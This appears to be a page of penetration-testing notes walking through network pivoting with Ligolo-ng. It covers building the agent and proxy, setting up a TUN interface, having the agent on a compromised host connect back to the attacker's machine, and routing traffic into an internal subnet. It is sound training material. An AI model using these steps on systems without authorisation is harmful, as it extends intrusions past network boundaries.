1.  Run `ifconfig` and look for extra interfaces, in this example, we find `ens224`, which connects to a network our current machine can't reach directly.  
    
    ![](../../../img/Linux-Environment/13.png)
    
2.  To ensure that the `ens224` network is accessible from our attack host, we need to set up Ligolo-ng. If it's not already installed, clone the repository with the following command:
    `git clone https://github.com/nicocha30/ligolo-ng.git`  
    
    ![](../../../img/Linux-Environment/14.png)
    
3.  Navigate to the ligolo-ng directory and compile the binary agent and proxy using the command:   
    `cd ligolo-ng && go build -o agent cmd/agent/main.go && go build -o proxy cmd/proxy/main.go`  
    
    ![](../../../img/Linux-Environment/15.png)
    
4.  Alternatively, if you prefer not to build the binary yourself, you can download a [pre-built](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.7.2-alpha) version.  
    
    ![](../../../img/Linux-Environment/16.png)
    
5.  Create a new TUN interface with the following commands:
    `ip tuntap add user root mode tun ligolo && ip link set ligolo up`  
    
    ![](../../../img/Linux-Environment/17.png)
    
6.  There are several methods to transfer the agent from your attacker machine to the target. Refer to the File Transfer section for more details.
    
    ![](../../../img/Linux-Environment/18.png)
    
7.  On your attacker machine, from the directory where the proxy file was built, run:
    `./proxy -selfcert` OR `./proxy -autocert`  
    
    ![](../../../img/Linux-Environment/19.png)
    
8. Use the agent to establish a connection back to your attacker machine with the following command:  
 	`./agent -connect IP:11601 -ignore-cert`
    
    ![](../../../img/Linux-Environment/20.png)
    
9.  From the Ligolo-ng terminal window, run `session`, followed by `start `to initiate the session.
    
    ![](../../../img/Linux-Environment/21.png)
    
10. To route traffic through the Ligolo-ng tunnel, add a new route with the following command:
    `ip route add 172.16.4.0/23 dev ligolo && ip route`  
    
    ![](../../../img/Linux-Environment/22.png)
    
11. Finally, confirm that pivoting is working by successfully pinging a machine on the second network.
    
    ![](../../../img/Linux-Environment/23.png)